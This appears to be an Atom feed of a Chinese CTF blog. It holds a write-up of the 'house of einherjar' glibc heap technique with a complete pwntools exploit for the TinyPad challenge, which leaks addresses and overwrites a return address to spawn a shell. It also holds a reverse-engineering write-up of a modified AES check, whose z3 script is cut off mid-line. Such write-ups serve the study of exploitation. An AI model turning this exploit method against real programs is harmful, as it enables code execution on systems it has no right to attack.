<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pandaos&#39;s blog</title>
  
  
  <link href="https://panda0s.top/atom.xml" rel="self"/>
  
  <link href="https://panda0s.top/"/>
  <updated>2021-06-27T06:09:20.181Z</updated>
  <id>https://panda0s.top/</id>
  
  <author>
    <name>Pandaos</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>house of einherjar</title>
    <link href="https://panda0s.top/2021/06/27/house-of-einherjar/"/>
    <id>https://panda0s.top/2021/06/27/house-of-einherjar/</id>
    <published>2021-06-27T05:27:30.000Z</published>
    <updated>2021-06-27T06:09:20.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>这个利用手段可以将 top chunk 移动到任意内存，然后通过分配的内存取得对任意内存读写的权限。</p><p>利用条件：</p><ul><li>可以修改 top chunk 相邻 chunk 的 size 域低字节（通常是 off by one ）</li><li>需要泄漏堆地址、目标 fake_chunk 地址用于计算 prev_size</li></ul><p>利用方法： 修改物理相邻 top chunk 的 chunk 中 size 的  inuse 标志位，并伪造 prev_size 使其指向 fake_chunk，释放该 chunk，使 fake chunk 与 top chunk 合并。再次分配内存，将从 fake chunk 处开始分配。</p><p>fake chunk 中的 size 与 伪造 prev_size 相同来绕过 size(P) == prev_size(next_chunk(P))，并且 fd、bk、fd_nextsize、bk_nextsize 均指向 fake chunk 来绕过 check。</p><p>原理很简单，做题的时候遇到很多细节处理起来还是不太顺手…</p><h2 id="SECCOND-TinyPad"><a href="#SECCOND-TinyPad" class="headerlink" title="SECCOND TinyPad"></a>SECCOND TinyPad</h2><p>主要特点如下:</p><ul><li>没有开 PIE</li><li>bss 上有堆地址</li><li>输入函数存在 off by one</li><li>分配 note 初始填充无0截断</li><li>修改 note 有0截断</li><li>bss 段可输入数据</li><li>有 UAF，可以泄漏堆地址与libc地址</li></ul><p>这道题貌似可以用 unlink attack，但是 edit 有 0 截断，不是很方便，于是尝试将 top chunk 移动到 bss 段上，利用创建 note 来修改 bss 段的地址表。</p><p>信息泄漏，这道题存在 UAF，先创建 note 删除后进入 unsorted bin，fd 地址是 libc 中的地址，再释放另外一个 chunk，新释放的 chunk 的 fd 指向堆中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 1</span><br>Add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 2</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 3</span><br>Add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\xCC&#x27;</span> * (<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># 4</span><br><span class="hljs-comment"># leak libc</span><br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># leak heap</span><br>Del(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_raw_heap = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak raw heap: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_raw_heap))<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 3\n # CONTENT: &#x27;</span>)<br>leak_raw_libc = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_raw_libc - <span class="hljs-number">0x39bb78</span><br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p>edit 的内容会先读取到 tinypad(0x604020) 然后再用 strcpy 复制到对应的 note 堆内存，利用 edit 这一点，我们在 tinypad 处构造 fake chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk_addr =  <span class="hljs-number">0x602040</span><br>tsize = leak_raw_heap + <span class="hljs-number">0xa0</span> - fake_chunk_addr<br>print(<span class="hljs-string">&quot;fake size: &quot;</span>, <span class="hljs-built_in">hex</span>(tsize))<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(tsize + <span class="hljs-number">1</span>)<br>fake_chunk += p64(fake_chunk_addr) <span class="hljs-comment">#fd</span><br>fake_chunk += p64(fake_chunk_addr) <span class="hljs-comment">#bk</span><br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x90</span> + p64(tsize)) <span class="hljs-comment"># 3 </span><br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x97</span>)<br>Edit(<span class="hljs-number">3</span>, fake_chunk)<br><br><br>Del(<span class="hljs-number">4</span>)<br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment">### 已经成功将 top 转移到 tinypad</span><br></code></pre></td></tr></table></figure><p>最后泄漏__environ的值获得栈地址，计算 main 函数的返回地址保存位置，修改返回地址为 one_gadget 即可 getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>) <span class="hljs-comment"># top -&gt; 602130</span><br><br><br>fake_pad = p64(<span class="hljs-number">0xAABBCCDD11223344</span>)<br>fake_pad += p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;__environ&#x27;</span>])<br><br>Add(<span class="hljs-number">0xe0</span>, fake_pad)<br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_stack = u64(p.recvn(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak stack: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_stack))<br>Edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;AAAAAAAA&#x27;</span> + p64(leak_stack - <span class="hljs-number">0xe8</span>))<br><br>one_gadget = <span class="hljs-number">0x3f3d6</span> + libc_base<br>Edit(<span class="hljs-number">1</span>, p64(one_gadget))<br>Exit()<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br>bin_file = <span class="hljs-string">&#x27;./tinypad&#x27;</span><br><br><br>libc = ELF(libc_file_name)<br><br>elf = ELF(bin_file)<br>p = process([ld_file_name, bin_file],<br>           env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file_name&#125;)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>, content)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(Y/n)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exit</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>)<br><br><span class="hljs-comment"># leak libc</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 1</span><br>Add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 2</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 3</span><br>Add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\xCC&#x27;</span> * (<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># 4</span><br><br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># leak heap</span><br>Del(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_raw_heap = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak raw heap: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_raw_heap))<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 3\n # CONTENT: &#x27;</span>)<br>leak_raw_libc = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_raw_libc - <span class="hljs-number">0x39bb78</span><br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment"># 0x55555679c1b0 + 0xa1 - fake_chunk_addr ==  tsize</span><br><br>fake_chunk_addr =  <span class="hljs-number">0x602040</span><br>tsize = leak_raw_heap + <span class="hljs-number">0xa0</span> - fake_chunk_addr<br>print(<span class="hljs-string">&quot;fake size: &quot;</span>, <span class="hljs-built_in">hex</span>(tsize))<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(tsize + <span class="hljs-number">1</span>)<br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x90</span> + p64(tsize)) <span class="hljs-comment">#3</span><br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x97</span>)<br>Edit(<span class="hljs-number">3</span>, fake_chunk)<br><br>gdb.attach(p)<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>Del(<span class="hljs-number">4</span>)<br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment">### 已经成功将 top 转移到 tinypad</span><br>Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>) <span class="hljs-comment"># top -&gt; 602130</span><br><br><br>fake_pad = p64(<span class="hljs-number">0xAABBCCDD11223344</span>)<br>fake_pad += p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;__environ&#x27;</span>])<br><br>Add(<span class="hljs-number">0xe0</span>, fake_pad)<br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_stack = u64(p.recvn(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak stack: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_stack))<br>Edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;AAAAAAAA&#x27;</span> + p64(leak_stack - <span class="hljs-number">0xe8</span>))<br><br>one_gadget = <span class="hljs-number">0x3f3d6</span> + libc_base<br>Edit(<span class="hljs-number">1</span>, p64(one_gadget))<br>Exit()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-of-einherjar&quot;&gt;&lt;a href=&quot;#house-of-einherjar&quot; class=&quot;headerlink&quot; title=&quot;house of einherjar&quot;&gt;&lt;/a&gt;house of einherjar&lt;/h1&gt;&lt;p&gt;这个利用手段</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://panda0s.top/tags/PWN/"/>
    
    <category term="heap" scheme="https://panda0s.top/tags/heap/"/>
    
    <category term="one_gadget" scheme="https://panda0s.top/tags/one-gadget/"/>
    
    <category term="off_by_one" scheme="https://panda0s.top/tags/off-by-one/"/>
    
    <category term="einherjar" scheme="https://panda0s.top/tags/einherjar/"/>
    
  </entry>
  
  <entry>
    <title>gkctf KillerAid</title>
    <link href="https://panda0s.top/2021/06/26/gkctf-KillerAid/"/>
    <id>https://panda0s.top/2021/06/26/gkctf-KillerAid/</id>
    <published>2021-06-26T09:26:05.000Z</published>
    <updated>2021-06-26T09:30:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="挂科CTF-KillerAid"><a href="#挂科CTF-KillerAid" class="headerlink" title="挂科CTF KillerAid"></a>挂科CTF KillerAid</h1><p>题目下载: <a href="/2021/06/26/gkctf-KillerAid/KillerAid.zip" title="KillerAid.zip">KillerAid.zip</a></p><p>C# 逆向，DLL做核心验证，DLL 里面有反调试，简单 patch 即可</p><p>然后有一个极其恶心的 AES 魔改算法</p><p>行移位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myshift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>];<br><br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>];<br><br><br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>];<br><br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>外层的也很恶心</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mydeaes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">char</span> * iv,<span class="hljs-keyword">int</span> plen, <span class="hljs-keyword">char</span> *key)</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> pArray0[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> pArray1[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> pIv[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> key_use[<span class="hljs-number">16</span>];<br><br><br>    convertToIntArray(iv, pIv);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k1 = <span class="hljs-number">31</span>; k1 &gt;= <span class="hljs-number">0</span>; k1 -= <span class="hljs-number">1</span>) &#123;<br><br>        <span class="hljs-built_in">memcpy</span>(key_use, key, <span class="hljs-number">16</span>);<br>        getRoundIvAndKey(k1, iv, key_use, pIv);  <span class="hljs-comment">// f8 82</span><br>        extendKey(key_use);<span class="hljs-comment">//扩展密钥</span><br><br><br>        convertToIntArray(&amp;p[<span class="hljs-number">16</span>], pArray1);<br>        convertToIntArray(&amp;p[<span class="hljs-number">0</span>], pArray0);<br><br>        addRoundKey(pArray1, <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            mydeshift(pArray1);<br>            deSubBytes(pArray1);<br>            addRoundKey(pArray1, i);<br><br>            myTranspose(pArray1);<br>            deMixColumns(pArray1);<span class="hljs-comment">//列混合</span><br>            myTranspose(pArray1);<br>        &#125;<br>        mydeshift(pArray1);<span class="hljs-comment">//行移位</span><br>        deSubBytes(pArray1);<span class="hljs-comment">//字节代换</span><br>        addRoundKey(pArray1, <span class="hljs-number">0</span>);<span class="hljs-comment">//一开始的轮密钥加</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>                pArray1[i][j] ^= pArray0[i][j];<br>            &#125;<br>        &#125;<br><br><br>        addRoundKey(pArray0, <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            mydeshift(pArray0);<br>            deSubBytes(pArray0);<br>            addRoundKey(pArray0, i);<br><br>            myTranspose(pArray0);<br>            deMixColumns(pArray0);<span class="hljs-comment">//列混合</span><br>            myTranspose(pArray0);<br>        &#125;<br>        mydeshift(pArray0);<span class="hljs-comment">//行移位</span><br>        deSubBytes(pArray0);<span class="hljs-comment">//字节代换</span><br>        addRoundKey(pArray0, <span class="hljs-number">0</span>);<span class="hljs-comment">//一开始的轮密钥加</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>                pArray0[i][j] ^= pIv[i][j];<br>            &#125;<br>        &#125;<br>        convertArrayToStr(pArray0, &amp;p[<span class="hljs-number">0</span>]);<br>        convertArrayToStr(pArray1, &amp;p[<span class="hljs-number">16</span>]);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>解密目标数据得到: Meaningless_!$!%*@^%#%_Code 字符串</p><p>C#层还有一个 code 计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>flag2 = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;Meaningless_!$!%*@^%#%_Code&#x27;</span>)<br><span class="hljs-built_in">id</span> = [BitVec(<span class="hljs-string">&#x27;a%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>fuckId = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">id</span>]<br>tt = <span class="hljs-built_in">bytearray</span>(target)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag2)):<br>    <span class="hljs-built_in">id</span>[j % <span class="hljs-built_in">len</span>(target)] ^= flag2[j % <span class="hljs-built_in">len</span>(flag2)]<br><br>s = Solver()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    s.add(<span class="hljs-built_in">id</span>[i] == target[i])<br><br>s.check()<br>res = 